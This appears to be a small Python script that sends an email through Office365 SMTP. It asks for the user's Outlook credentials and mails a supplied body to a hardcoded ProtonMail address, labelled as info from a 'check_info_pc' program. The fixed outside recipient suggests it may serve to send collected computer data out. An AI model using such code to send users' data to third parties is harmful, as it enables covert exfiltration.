import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import getpass  # Import the getpass module

def send_email(sender_email, password, receiver_email, subject, body):
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    try:
        with smtplib.SMTP('smtp.office365.com', 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Email sent successfully!")
    except smtplib.SMTPException as e:
        print(f"Failed to send email: {e}")

# Example usage
def content_email(body):
    sender_email = input("Enter your outlook/microsoft/hotmail address: ") 
    password = getpass.getpass("Enter your email password: ")  
    receiver_email = "jojotestsafe@proton.me"
    subject = "Info sent from my check_info_pc program"
    send_email(sender_email, password, receiver_email, subject, body)

